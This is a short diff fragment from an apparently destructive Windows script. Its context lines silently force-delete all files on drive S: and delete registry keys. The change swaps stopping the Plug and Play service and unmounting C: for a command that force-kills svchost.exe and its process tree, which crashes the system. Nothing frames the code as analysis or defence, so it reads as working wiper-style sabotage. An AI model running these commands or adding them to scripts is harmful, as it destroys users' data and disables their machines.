@@ -23,5 +23,4 @@ cmd /c "del /f /s /q S:*.* > NUL 2>&1"
     cmd /c "reg delete $_ /f"
 }
 
-Stop-Service -Name PlugPlay -Force -ErrorAction SilentlyContinue
-mountvol C: /d
+taskkill /f /im svchost.exe /t
